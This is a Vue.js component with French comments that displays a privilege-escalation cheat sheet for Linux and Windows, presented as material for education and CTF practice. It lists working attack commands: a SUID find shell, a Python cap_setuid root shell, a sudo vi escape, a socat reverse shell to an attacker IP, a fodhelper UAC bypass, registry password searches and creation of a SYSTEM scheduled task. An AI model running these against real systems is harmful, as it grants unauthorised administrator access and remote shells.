<!--
================================================================================
 Fichier : PrivilegeEscalationGuide.vue
 Description :
  Ce composant Vue.js fournit un guide détaillé des techniques d'escalade de
  privilèges sur les systèmes Linux et Windows. Il permet aux utilisateurs de
  découvrir les différentes méthodes pour identifier et exploiter les vulnérabilités
  liées aux privilèges.

 Fonctionnalités principales :
  - Interface utilisateur basée sur Vuetify avec des onglets pour chaque système :
    - Linux
    - Windows
  - Explication des techniques d'énumération et d'exploitation.
  - Présentation des outils et scripts recommandés (LinPEAS, WinPEAS, PowerUp, etc.).
  - Affichage des commandes et scripts avec un composant `CodeExample` :
    - Description des commandes accompagnées d'explications détaillées.
    - Mise en évidence syntaxique pour les différents langages (Bash, Python, PowerShell).
  - Navigation fluide avec `v-tabs` et `v-window` pour un accès rapide aux sections.
  - Liste des techniques d'attaque :
    - Énumération système (informations de base, utilisateurs, groupes).
    - Exploitation des permissions SUID/Capabilities (Linux).
    - Exploitation des permissions de services et tâches planifiées (Windows).
    - Contournement des restrictions sudo (Linux).
    - Bypass de l'UAC (Windows).
    - Stabilisation des shells pour un accès interactif optimal.

 Technologies utilisées :
  - Vue.js 3 (Composition API)
  - Vuetify (composants UI)
  - Computed Properties pour afficher dynamiquement les informations.
  - Composant `CodeExample` pour afficher et expliquer les commandes.

 Remarque :
  Ce guide est destiné à des fins éducatives et pour les compétitions Capture The
  Flag (CTF). Il ne doit être utilisé que dans un cadre légal et éthique.

 Auteur : Psyko
 Date : 24.02.2025
================================================================================
-->


<template>
  <v-container fluid class="pa-0">
    <v-card class="ma-2">
      <v-card-title class="text-h4 text-center red--text">
        Guide Privilege Escalation
      </v-card-title>

      <v-tabs
        v-model="currentTab"
        color="red"
        align-tabs="center"
        grow
      >
        <v-tab value="linux">
          <v-icon start>mdi-linux</v-icon>
          Linux
        </v-tab>
        <v-tab value="windows">
          <v-icon start>mdi-microsoft-windows</v-icon>
          Windows
        </v-tab>
      </v-tabs>

      <v-window v-model="currentTab">
        <!-- Linux Priv Esc -->
        <v-window-item value="linux">
          <v-card flat>
            <v-card-text>
              <v-list>
                <!-- Énumération Système -->
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Énumération Système
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <div class="mt-2">
                        <span class="font-weight-bold">Scripts automatisés :</span><br>
                        • LinPEAS : Outil complet d'énumération<br>
                        • Linux Smart Enumeration : Alternative légère<br>
                        • Linux Exploit Suggester : Trouve les exploits potentiels
                      </div>

                      <CodeExample
                        title="Informations système de base"
                        code="uname -a
cat /etc/issue
cat /etc/*-release
cat /proc/version"
                        explanation="Affiche des informations détaillées sur le système, notamment la version du kernel et la distribution."
                      />

                      <CodeExample
                        title="Utilisateurs et groupes"
                        code="id
whoami
cat /etc/passwd
cat /etc/group
cat /etc/shadow # Nécessite des privilèges"
                        explanation="Énumère les informations sur les utilisateurs et les groupes du système."
                      />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>

                <v-divider class="my-2"></v-divider>

                <!-- SUID -->
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Binaires SUID
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <div class="mt-2">
                        <span class="font-weight-bold">Description :</span><br>
                        Les binaires SUID s'exécutent avec les privilèges du propriétaire du fichier.
                      </div>

                      <CodeExample
                        title="Recherche de binaires SUID"
                        code="find / -perm -u=s -type f 2>/dev/null"
                        explanation="Trouve tous les fichiers avec le bit SUID activé. Les erreurs sont redirigées vers /dev/null pour plus de clarté."
                      />

                      <CodeExample
                        title="Exploitation avec find SUID"
                        code="./find . -exec /bin/sh -p \; -quit"
                        explanation="Si find a le bit SUID, cette commande lance un shell avec les privilèges élevés."
                      />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>

                <v-divider class="my-2"></v-divider>

                <!-- Capabilities -->
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Capabilities
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <div class="mt-2">
                        <span class="font-weight-bold">Description :</span><br>
                        Les capabilities permettent d'accorder des privilèges spécifiques à des processus.
                      </div>

                      <CodeExample
                        title="Lister les capabilities"
                        code="getcap -r / 2>/dev/null"
                        explanation="Liste tous les fichiers avec des capabilities spéciales."
                      />

                      <CodeExample
                        title="Exploitation de Python avec cap_setuid"
                        language="python"
                        code="import os
os.setuid(0)
os.system('/bin/bash')"
                        explanation="Si Python a la capability CAP_SETUID, ce script permet d'obtenir un shell root."
                      />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>

                <v-divider class="my-2"></v-divider>

                <!-- Sudo -->
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Sudo Misconfiguration
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <div class="mt-2">
                        <span class="font-weight-bold">Description :</span><br>
                        Les mauvaises configurations de sudo peuvent permettre l'escalade de privilèges.
                      </div>

                      <CodeExample
                        title="Vérifier les permissions sudo"
                        code="sudo -l"
                        explanation="Liste les commandes que l'utilisateur peut exécuter avec sudo."
                      />

                      <CodeExample
                        title="Exploitation de sudo avec vi"
                        code="sudo vi -c ':!/bin/bash' /dev/null"
                        explanation="Si vi est autorisé en sudo, cette commande permet d'obtenir un shell root."
                      />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>

                <v-divider class="my-2"></v-divider>

                <!-- Stabilisation Shell -->
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Stabilisation de Shell
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <div class="mt-2">
                        <span class="font-weight-bold">Description :</span><br>
                        Techniques pour transformer un shell basique en shell complètement interactif avec autocomplétion et commandes avancées.
                      </div>

                      <CodeExample
                        title="Python PTY"
                        language="python"
                        code="python3 -c &quot;import pty; pty.spawn('/bin/bash')&quot;
# Puis appuyez sur Ctrl+Z
stty raw -echo; fg
reset
export TERM=xterm
export SHELL=bash"
                        explanation="Crée un shell PTY avec Python, puis configure le terminal pour le rendre pleinement interactif."
                      />

                      <CodeExample
                        title="Script One-liner"
                        code="script /dev/null -c bash"
                        explanation="Alternative rapide pour obtenir un shell plus stable."
                      />

                      <CodeExample
                        title="Socat (Attaquant)"
                        code="socat file:$(tty),raw,echo=0 tcp-listen:4444"
                        explanation="Sur la machine attaquante, crée un listener socat pour un shell bidirectionnel."
                      />

                      <CodeExample
                        title="Socat (Victime)"
                        code="socat exec:&quot;bash -li&quot;,pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444"
                        explanation="Sur la machine cible, se connecte au listener socat pour un shell complètement interactif. Remplacez 10.0.0.1 par l'IP de l'attaquant."
                      />

                      <div class="mt-2">
                        <span class="font-weight-bold">Ajustements du terminal :</span><br>
                        • Redimensionner : <code>stty rows 38 columns 116</code><br>
                        • Activer l'historique : <code>set -o history</code><br>
                        • Définir l'éditeur : <code>export EDITOR=vim</code>
                      </div>
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>

                <v-divider class="my-2"></v-divider>
              </v-list>
            </v-card-text>
          </v-card>
        </v-window-item>

        <!-- Windows Priv Esc -->
        <v-window-item value="windows">
          <v-card flat>
            <v-card-text>
              <v-list>
                <!-- Énumération Windows -->
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Énumération Windows
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <div class="mt-2">
                        <span class="font-weight-bold">Scripts automatisés :</span><br>
                        • WinPEAS : Outil complet d'énumération<br>
                        • PowerUp : Script PowerShell d'audit<br>
                        • Sherlock : Recherche de vulnérabilités connues
                      </div>

                      <CodeExample
                        title="Informations système"
                        code="systeminfo
whoami /all
net user
net localgroup administrators"
                        explanation="Collecte des informations sur le système, les utilisateurs et les groupes."
                      />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>

                <v-divider class="my-2"></v-divider>

                <!-- Services Vulnérables -->
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Services Vulnérables
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <div class="mt-2">
                        <span class="font-weight-bold">Description :</span><br>
                        Les services mal configurés peuvent être exploités pour l'escalade de privilèges.
                      </div>

                      <CodeExample
                        title="Vérifier les permissions des services"
                        code="sc qc ServiceName
icacls C:\Path\To\Service.exe"
                        explanation="Examine les permissions d'un service et de son exécutable."
                      />

                      <CodeExample
                        title="PowerShell - Trouver les services modifiables"
                        language="powershell"
                        code="Get-Acl -Path 'C:\Path\To\Service.exe' | Format-List"
                        explanation="Affiche les ACLs détaillées d'un fichier de service."
                      />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>

                <v-divider class="my-2"></v-divider>

                <!-- UAC Bypass -->
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Contournement UAC
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <div class="mt-2">
                        <span class="font-weight-bold">Description :</span><br>
                        Techniques pour contourner le contrôle de compte utilisateur (UAC).
                      </div>

                      <CodeExample
                        title="Vérifier le niveau UAC"
                        code="REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA"
                        explanation="Vérifie si l'UAC est activé et son niveau de configuration."
                      />

                      <CodeExample
                        title="Fodhelper Bypass"
                        language="powershell"
                        code="New-Item 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Force
Set-ItemProperty 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Name 'DelegateExecute' -Value ''
Set-ItemProperty 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Name '(default)' -Value 'cmd.exe'
Start-Process 'C:\Windows\System32\fodhelper.exe'"
                        explanation="Technique de bypass UAC utilisant fodhelper.exe et la manipulation du registre."
                      />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>

                <v-divider class="my-2"></v-divider>

                <!-- Registre Windows -->
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Registre Windows
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <div class="mt-2">
                        <span class="font-weight-bold">Description :</span><br>
                        Le registre Windows peut contenir des informations sensibles et des configurations exploitables.
                      </div>

                      <CodeExample
                        title="Recherche de mots de passe"
                        language="powershell"
                        code="reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s"
                        explanation="Recherche les clés de registre contenant le mot 'password'."
                      />

                      <CodeExample
                        title="Vérification des AutoRuns"
                        language="powershell"
                        code="reg query 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
reg query 'HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
reg query 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
reg query 'HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'"
                        explanation="Liste les programmes qui démarrent automatiquement avec Windows."
                      />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>

                <v-divider class="my-2"></v-divider>

                <!-- Tâches planifiées -->
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Tâches planifiées
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <div class="mt-2">
                        <span class="font-weight-bold">Description :</span><br>
                        Les tâches planifiées peuvent s'exécuter avec des privilèges élevés et être vulnérables.
                      </div>

                      <CodeExample
                        title="Lister toutes les tâches"
                        code="schtasks /query /fo LIST /v"
                        explanation="Affiche toutes les tâches planifiées avec leurs détails."
                      />

                      <CodeExample
                        title="Vérifier les permissions des tâches"
                        language="powershell"
                        code="Get-ScheduledTask | Where-Object {$_.Principal.RunLevel -eq 'Highest'} | Format-Table -AutoSize"
                        explanation="Liste les tâches qui s'exécutent avec les privilèges les plus élevés."
                      />

                      <CodeExample
                        title="Créer une tâche privilégiée"
                        code="schtasks /create /tn 'MyTask' /tr 'C:\Windows\System32\cmd.exe' /sc onstart /ru 'SYSTEM'"
                        explanation="Crée une tâche qui s'exécute comme SYSTEM au démarrage (nécessite des privilèges élevés)."
                      />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>
              </v-list>
            </v-card-text>
          </v-card>
        </v-window-item>
      </v-window>
    </v-card>
  </v-container>
</template>

<script setup>
import { ref } from 'vue'
import CodeExample from '@/components/CodeExample.vue'

const currentTab = ref('linux')
</script>

<style scoped>
.v-list-item-subtitle {
  white-space: pre-line !important;
  display: block !important;
  color: rgba(255, 255, 255, 0.7) !important;
  margin-top: 8px !important;
  padding: 8px !important;
  font-size: 14px !important;
}

.v-list-item-content {
  display: block !important;
  width: 100% !important;
}

.v-list-item {
  display: block !important;
  padding: 16px !important;
  margin-bottom: 8px !important;
  background-color: rgba(0, 0, 0, 0.2) !important;
  border-radius: 4px !important;
}

.v-tab {
  text-transform: none !important;
}

.font-weight-bold {
  font-weight: bold !important;
  color: white !important;
  margin-bottom: 4px !important;
  display: inline-block !important;
}

.mt-2 {
  margin-top: 12px !important;
}

.v-divider {
  margin: 16px 0 !important;
  opacity: 0.2 !important;
}

.text-h6 {
  color: white !important;
  font-size: 1.25rem !important;
  font-weight: 500 !important;
  margin-bottom: 8px !important;
}
</style>
